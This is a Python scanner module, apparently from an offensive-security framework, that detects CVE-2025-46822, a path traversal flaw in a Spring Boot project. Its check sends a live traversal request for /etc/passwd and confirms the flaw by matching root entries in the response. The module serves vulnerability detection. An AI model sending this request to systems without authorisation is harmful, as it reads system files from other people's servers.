#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OsamaTaher/Java-springboot-codebase is a collection of Java and Spring Boot code snippets, applications, and p."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Java-springboot-codebase 1.1 - Arbitrary File Read Detection',
        'description': 'OsamaTaher/Java-springboot-codebase is a collection of Java and Spring Boot code snippets, applications, and projects. Prior to commit c835c6f7799eacada4c0fc77e0816f250af01ad2, insufficient path traversal mechanisms make absolute path traversal possible. This vulnerability allows unauthorized access to sensitive internal files. Commit c835c6f7799eacada4c0fc77e0816f250af01ad2 contains a patch for the issue.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'java', 'springboot', 'codebase', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/OsamaTaher/Java-springboot-codebase',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-46822',
            'https://github.com/OsamaTaher/Java-springboot-codebase/security/advisories/GHSA-q6mm-cm37-w637',
            'https://github.com/OsamaTaher/Java-springboot-codebase/commit/c835c6f7799eacada4c0fc77e0816f250af01ad2',
            'https://github.com/PuddinCat/GithubRepoSpider',
        ],
        'cve': 'CVE-2025-46822',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Whitelabel Error Page', 'explicit mapping',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/api/v1/files/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Java-springboot-codebase 1.1 - Arbitrary File Read detected', path=path)
            return True
        return False

